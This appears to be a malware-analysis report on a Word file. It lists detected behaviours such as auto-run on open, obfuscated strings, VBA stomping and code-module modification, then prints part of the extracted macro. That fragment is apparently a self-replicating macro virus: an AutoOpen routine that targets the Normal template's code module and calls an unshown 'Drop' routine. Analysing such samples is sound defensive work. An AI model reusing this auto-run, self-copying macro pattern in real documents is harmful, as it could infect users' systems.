behavior.AddFromString: May attempt to modify the VBA code
behavior.AutoOpen: Runs when the Word document is opened
behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.Chr: May attempt to obfuscate specific str
behavior.CodeModule: May attempt to modify the VBA code
behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.VBA Stomping: VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code
behavior.VBComponents: May attempt to modify the VBA code
behavior.VBProject: May attempt to modify the VBA code

docinfo.macro:
Sub ForsakenRun()
Forsaken
End Sub

Public CodeContainer As Object
Public Runner As Object
Sub AutoOpen()
'On Error Resume Next
If MacroContainer = NormalTemplate Then
Set CodeContainer = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set Runner = Normal.ThisDocument
Else
Set CodeContainer = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set Runner = Project.ThisDocument
End If
'CodeContainer.AddFromString ("Sub ForsakenRun()" & vbCr & "Forsaken" & vbCr & "End Sub")
Drop
End Sub
